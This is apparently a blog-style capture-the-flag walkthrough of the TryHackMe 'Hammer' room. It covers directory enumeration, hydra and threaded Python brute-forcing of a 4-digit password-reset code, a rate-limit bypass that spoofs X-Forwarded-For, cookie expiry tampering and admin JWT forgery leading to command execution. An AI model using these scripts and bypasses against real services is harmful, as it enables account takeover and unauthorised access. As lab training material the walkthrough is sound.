> With the [Hammer](https://tryhackme.com/r/room/hammer) in hand, can you bypass the authentication mechanisms and get RCE on the system ?

## Enumeration

Let's see our nmap scan :

```shell
$ nmap -p- -T4 target
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-14 22:38 CET
Nmap scan report for target (10.10.248.231)
Host is up (0.086s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste

Nmap done: 1 IP address (1 host up) scanned in 181.84 seconds
```

Apart of the **SSH** service on port `22`, we put our eyes on the `waste` service on port `1337`.

```shell
$ nmap -p1337 -sV target
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-14 22:44 CET
Nmap scan report for target (10.10.248.231)
Host is up (0.061s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.54 seconds
```

This service is an **Apache web server** which, when we connect to it using Firefox, directs us to a login form.

I tried to see if this form was vulnerable to **SQL Injections** thanks to sqlmap but no result came out from it.

After trying a few common credentials, I enumerated the directories using **Gobuster** :

```shell
$ gobuster dir -u http://10.10.248.231:1337 -w /usr/share/wordlists/seclis

```

These few directories could be explored (with a phpmyadmin login form) but I didn’t obtain any valuable information from it especially.

So, I decided to look at the source code of the `index.php` (the login form) and a comment from the Dev let us know that the **directory naming convention** always contains the prefix of `"hmr_"` before each directory name :

![2](/assets/img/tryhackme/ctf/hammer/2.png)

So using the `common.txt` wordlist from seclists and **the sed command** to create our own wordlist containing this prefix :

```shell
$ sed 's/^/hmr_/' common.txt > hmr_wordlist.txt
$ cat hmr_wordlist.txt
hmr_.bash_history
hmr_.bashrc
hmr_.cache
hmr_.config
hmr_.cvs
hmr_.cvsignore
hmr_.env
hmr_.forward
hmr_.git
hmr_.git-rewrite
hmr_.git/HEAD
hmr_.git/config
hmr_.git/index
hmr_.git/logs/
hmr_.git_release
hmr_.gitattributes
hmr_.gitconfig
hmr_.gitignore
hmr_.gitk
hmr_.gitkeep
hmr_.gitmodules
hmr_.gitreview
hmr_.history
hmr_.hta
hmr_.htaccess
hmr_.htpasswd
[...]
```

Thanks to this wordlist, we can enumerate once again using **Gobuster** :

```

In `/hmr_images`, we can find a file called `hammer.webp` which is a random image :

![3](/assets/img/tryhackme/ctf/hammer/3.png)

The `/hmr_logs` contains a file called `error.logs`, this one gives us information about some potential credentials that we could use against the login form, particularly an email with `hammer.thm` domain (this user tried to connect to different pages) :

![4](/assets/img/tryhackme/ctf/hammer/4.png)

We can write this email on a note and come back to the login form. On this form, there is a *“Forgot your password?”* link that redirects us to page where we can technically reset our password when entering a **valid email** (otherwise it displays a message saying the written email doesn’t exist).

So, we enter the email and confirm it is a valid one :

![5](/assets/img/tryhackme/ctf/hammer/5.png)

![6](/assets/img/tryhackme/ctf/hammer/6.png)

It is indeed a valid since it’s asking us a **recovery code** (that we do not have but it doesn’t matter).

## Bypass Authentication 

We try to bruteforce the access to this account using **hydra** (`hydra -l [EMAIL] -P /usr/share/wordlists/rockyou.txt 10.10.248.231 http-post-form "/:email=^USER^&password=^PASS^:Invalid Email or Password!" -t 10 -V`) but this doesn’t give us any results. 

So we will have to reset the account’s password by using the `reset_password` page.

By intercepting the POST request using **Burp**, we notice that we can manipulate the timer parameter (it just changes the display but this timer is managed by the server) and the **recovery code** :

![7](/assets/img/tryhackme/ctf/hammer/7.png)

Once again, I tried to bruteforce my way through using a **Python script** and find the recovery code. It will try all the different combinations of recovery code possible on 4 digits.

```python
import requests

# Target URL
url = "http://10.10.141.73:1337/reset_password.php"

# Headers with session cookie
headers = {
    "Host": "10.10.141.73:1337",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.10.141.73:1337",
    "Referer": "http://10.10.141.73:1337/reset_password.php",
    "Cookie": "PHPSESSID=fq0f19f1o8377hhtb4aclp3oib",  # Replace with your session cookie
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

# Iterate over all possible 4-digit codes
for code in range(10000):
    recovery_code = f"{code:04}"  # Format as 4-digit number (e.g., 0001, 0023)
    data = {
        "recovery_code": recovery_code,
        "s": "180"  # Fixed value for 's' parameter
    }

    # Send POST request
    response = requests.post(url, headers=headers, data=data)

    # Check response content
    if "Invalid or expired recovery code!" not in response.text:
        print(f"[+] Recovery code found: {recovery_code}")
        print("[+] Response from server:", response.text)
        break
    else:
        print(f"[-] Tried code: {recovery_code}")

print("[-] Brute-force complete.")
```

However, after launching the script, the result shows us that there is a *“Rate limit”* after **9 tries** and blocks the POST requests for a few minutes on this session, making it impossible to simply brute force it this way.

When we verify the response, there is indeed a `Rate-Limit-Pending` that is decreasing each time we try a code.

![8](/assets/img/tryhackme/ctf/hammer/8.png)

So I need to find a way to bypass this rate limit and make sure the `Rate-Limit-Pending` header is not decreasing. 

I found a [GitHub page](https://github.com/tuhin1729/Bug-Bounty-Methodology/blob/main/RateLimit.md) giving some hints about how we could manage it.

If I use the `X-Forwarded-For` header in my request and put any IP (such as `1.1.1.1` at first) and I change it for every request, then the `Rate-Limit-Pending` header doesn’t change its value :

![9](/assets/img/tryhackme/ctf/hammer/9.png)

![10](/assets/img/tryhackme/ctf/hammer/10.png)

So we adjust our script by taking the `X-Forwarded-For` header in count :

```python
import requests
import random

# Target URL
url = "http://10.10.141.73:1337/reset_password.php"

# Headers with session cookie
base_headers = {
    "Host": "10.10.141.73:1337",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.10.141.73:1337",
    "Referer": "http://10.10.141.73:1337/reset_password.php",
    "Cookie": "PHPSESSID=fq0f19f1o8377hhtb4aclp3oib",  # Replace with your session cookie
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

# Function to generate a random IP address
def random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Iterate over all possible 4-digit codes
for code in range(10000):
    recovery_code = f"{code:04}"  # Format as 4-digit number (e.g., 0001, 0023)
    data = {
        "recovery_code": recovery_code,
        "s": "180"  # Fixed value for 's' parameter
    }

    # Add a random X-Forwarded-For header
    headers = base_headers.copy()
    headers["X-Forwarded-For"] = random_ip()

    # Send POST request
    response = requests.post(url, headers=headers, data=data)

    # Check response content
    if "Invalid or expired recovery code!" not in response.text:
        print(f"[+] Recovery code found: {recovery_code}")
        print("[+] Response from server:", response.text)
        break
    else:
        print(f"[-] Tried code: {recovery_code} | X-Forwarded-For: {headers['X-Forwarded-For']}")

print("[-] Brute-force complete.")
```

So now, we can try as many times as we want but… The countdown is always of **180 seconds** and if we didn’t find the recovery code in the meantime, then we have to restart it. With this script, we eventually reach the 180 seconds allowed. 

```shell
python3 brutecode.py

[...]
```

Hence, we need to find something else.

Thankfully for us, there is a solution. We can send multiple requests simultaneously using **multi-threading**. We will do this by using the `concurrent.futures` Python library to manage a pool of threads that will each be handling a portion of the task. Here is the updated code :

```python
import requests
import random
from concurrent.futures import ThreadPoolExecutor

# Target URL
url = "http://10.10.141.73:1337/reset_password.php"

# Headers with session cookie
base_headers = {
    "Host": "10.10.141.73:1337",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.10.141.73:1337",
    "Referer": "http://10.10.141.73:1337/reset_password.php",
    "Cookie": "PHPSESSID=fq0f19f1o8377hhtb4aclp3oib",  # Replace with your session cookie
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

# Function to generate a random IP address
def random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Function to brute-force a specific recovery code
def try_code(code):
    recovery_code = f"{code:04}"  # Format as 4-digit number (e.g., 0001, 0023)
    data = {
        "recovery_code": recovery_code,
        "s": "180"  # Fixed value for 's' parameter
    }

    # Add a random X-Forwarded-For header
    headers = base_headers.copy()
    headers["X-Forwarded-For"] = random_ip()

    # Send POST request
    response = requests.post(url, headers=headers, data=data)

    # Check response content
    if "Invalid or expired recovery code!" not in response.text:
        print(f"[+] Recovery code found: {recovery_code}")
        print("[+] Response from server:", response.text)
        return recovery_code  # Return the successful code

    return None

# Main function to manage the brute-force attack
def main():
    # Number of threads to use
    num_threads = 50

    # Create a thread pool
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        # Submit tasks for all 4-digit codes
        future_to_code = {executor.submit(try_code, code): code for code in range(10000)}

        # Process results as they are completed
        for future in future_to_code:
            result = future.result()
            if result is not None:
                print(f"[+] Code successfully brute-forced: {result}")
                executor.shutdown(wait=False)  # Stop all threads
                return

    print("[-] Brute-force attempt completed without success.")

if __name__ == "__main__":
    main()
```

We launch this script and obtain our recovery code :

## Taking Advantage Of JWT

However, the problem here is that we only have a few seconds of idling and it automatically logs out. Why is that ?

When we take a look at the page source, we notice a special script constantly looking (every second) for the `persistentSession` cookie parameter and redirecting to `logout.php` when the `persistentSession` cookie is not here :

However, when we look at the request we get on **Burp**, the `persistentSession` cookie is indeed here :

So why does it log us out ?

In order to know the reason, we need to head to the **Developper tools** once we login.

If we check the `persistentSession` cookie parameters, the expiration of the cookie is coming **20 seconds** after logging in to the dashboard.

So, if we change this value to later, we will get rid of this problem (we can even set an `Invalid Date`, it will still work and not log out).

Now that we have all the time in the world to continue, let’s see what it does if we try to access the flag :

Obviously, it doesn’t let us simply access it, saying that this command is not allowed.

Back in the Developer Tools, We can see that, other than the `persistentSession` or `PHPSESSION` cookie, there is a third one being called `token` which is a **JWT**.

Using [JWT.io](https://jwt.io/), we can decode our JWT and witness that in the payload, our `role` parameter is set to user.

But it also tells us that the signature is **invalid and** that we need to provide one.

Where can I find this signature ? Among the commands that we are able to execute on the server, there is the `ls` command.

The output shows us that a file called `188ade1.key` is in the working directory, so we can access `10.10.141.73:1337/188ade1.key` to retrieve and display it :

```shell
$ cat 188ade1.key
56058354efb3daa97ebab00fabd7a7d7#
```

We will try to put this key in [JWT.io](http://JWT.io) to verify the signature, and change the role parameter to **admin** at the same time.

We intercept the execution of the command using **Burp** and change the command to `cat /home/ubuntu/flag.txt` and the **JWT** (remember to also write the correct path of the key file so that it verifies it correctly, here it’s `/var/www/html/188ade1.key`).

And we obtain the **last flag** :
